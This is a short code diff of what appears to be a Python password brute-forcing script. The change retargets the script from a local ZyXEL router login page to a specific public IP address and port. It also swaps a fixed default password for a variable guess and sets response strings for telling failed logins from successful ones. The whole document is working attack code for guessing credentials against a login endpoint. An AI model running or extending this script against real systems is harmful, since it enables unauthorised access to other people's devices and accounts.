@@ -4,10 +4,10 @@ import random
 import string
 import json
 
-target_url = 'http://192.168.1.254/login.cgi'
+target_url = 'http://83.160.88.114:8080'
 target_username = 'user'
-if_contains_then_valid = ['<script>window.location="indexMain.cgi"</script>']
-if_contains_then_invalid = []
+if_contains_then_valid = []
+if_contains_then_invalid = ['not permission', 'is_invalid']
 
 def post_it(password):
 
@@ -19,7 +19,7 @@ def post_it(password):
 
     response = requests.post(target_url, allow_redirects=False, data={
     	'username': target_username,
-        'password': "ZyXEL ZyWALL Series",
+        'password': password,
         'Submit': "Login"
     })
     
